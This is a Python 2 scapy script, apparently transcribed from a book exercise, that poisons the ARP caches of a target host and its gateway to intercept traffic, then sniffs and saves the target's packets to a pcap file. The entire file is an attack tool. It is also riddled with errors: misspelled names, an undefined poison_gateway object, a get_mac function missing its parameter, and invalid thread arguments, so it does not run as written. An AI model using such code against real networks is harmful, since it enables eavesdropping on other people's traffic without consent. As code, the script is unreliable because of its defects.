from scapy.all import *
import os, sys, threading, signal

interface = "en1"
target_ip = ""
gateway_ip = ""
packet_count = 1000
conf.iface = interface		#set our interface
conf.verb = 0				#Set our interface

def banner():
	print "[***]	ARP cache poison p52	[***]"

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
	print "[*] Restoring target... "
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)
	os.kill(os.getpid(), signal.SIGINT)

def get_mac():
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
	for s,r in reponses:
		return r[Ether].src
		return None

def poison_target():
	poison_target = ARP()
	poison_target.op =2
	poison_target.psrc = target_ip
	poison_target.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac
	print "[*] Beginning the ARP Poison. [CTRL-C to stop] "
	while True:
		try:
			send(poison_target)
			send(poison_gateway)
			tiem.sleep(2)
		except KeyboardInterrupt:
			restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
		print "[*] ARP poison attack finished"
		return

def main():
	banner()
	print "[*] Setting up %s" % interface
	gateway_mac = get_mac(gateway_ip)
	if gateway_mac is None:
		print "[!!!] Failed to get gateway MAC. Exiting."
		sys.exit(0)
	else:
		print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)
	target_mac = get_mac(target_ip)
	if target_mac is None:
		print "[!!!] Failed to get target MAC. Exiting."
		sys.exit(0)
	else:
		print "[*] Target %s is at %s" % (target_ip, target_mac)
	poison_thread = threading.Thread(target = poison_target, args = gateway_ip, gateway_mac, target_ip, target_mac)
	poison_thread.start()
	try:
		print "[*] Starting sniffer for %d packets" % packet_count
		bpf_filter = "ip host %s" % target_ip
		packets = sniff(count=packet_count, filter=bpf_filter, iface=inerface)
		wrpcap('arper.pacap', packets)
		restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
	except KeyboardInterrupt:
		restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
		sys.exit(0)

if __name__ == '__main__':
	main()